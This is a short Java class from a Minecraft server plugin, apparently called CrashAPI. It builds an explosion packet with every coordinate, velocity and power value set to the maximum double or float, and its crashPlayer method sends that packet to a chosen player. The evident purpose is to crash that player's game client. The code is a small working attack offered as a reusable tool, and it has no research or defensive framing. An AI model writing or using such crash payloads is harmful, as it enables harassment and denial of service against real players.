package br.com.redewalker.kaduzin.engine.reflections;

import java.lang.reflect.Constructor;
import java.util.Collections;
import java.util.List;

import org.bukkit.entity.Player;

import br.com.redewalker.kaduzin.engine.utils.ReflectionUtils;

public class CrashAPI {

	private static Object packet;

	public static void crashPlayer(Player player) {
		try {
			ReflectionUtils.sendPacket(player, packet);
		} catch (Throwable e) {
			e.printStackTrace();
		}
	}

	static void load() {
		try 
		{
			Object Vec3D;
			Class<?> explosionClass;
			Class<?> vectorClass = ReflectionUtils.getNMSClass("Vec3D");

			explosionClass = ReflectionUtils.getNMSClass("PacketPlayOutExplosion");

			Constructor<?> Vector3dConstructor = vectorClass.getConstructor(double.class, double.class,	double.class);
			Vec3D = Vector3dConstructor.newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);

			Constructor<?> explosionConstructor = explosionClass.getConstructor(double.class, double.class,	double.class, float.class, List.class, vectorClass);
			packet = explosionConstructor.newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE,	Float.MAX_VALUE, Collections.emptyList(), Vec3D);
		} catch (Throwable e) {}
	}
}